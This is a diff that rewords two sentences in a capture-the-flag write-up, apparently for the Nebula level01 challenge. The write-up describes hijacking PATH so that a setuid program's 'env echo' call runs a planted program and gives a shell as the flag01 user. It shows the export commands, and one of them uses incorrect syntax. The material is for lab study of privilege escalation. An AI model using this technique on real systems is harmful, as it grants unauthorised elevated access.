@@ -28,7 +28,7 @@ Calling "/usr/bin/env echo" allows us to control what's in our environment and i
 $PATH=/usr/local/sbin/;/usr/local/bin;/usr/sbin;/sbin/;/bin/;
 
 If we place a program under /usr/local/sbin/echo it should be executed instead of /bin/echo.
-Permission denied for all those folders. But we can still change the $PATH in our env.
+Unfortunately we get a "permission denied" for all those directories. But we can still change the $PATH in our env.
 
 export PATH=/home/level01/:/usr/bin/:/usr/sbin/
 or export PATH=/home/level01/:$(PATH)
@@ -45,7 +45,7 @@ int main(void) {
   return 0;
 }
 
-Now just run ./flag01 to get the shell with flag01 uid instead of level01. 
+Now just run ./flag01 to get the shell with flag01 uid. 
 
 > getflag
 You have succesfully executed getflag on a target account
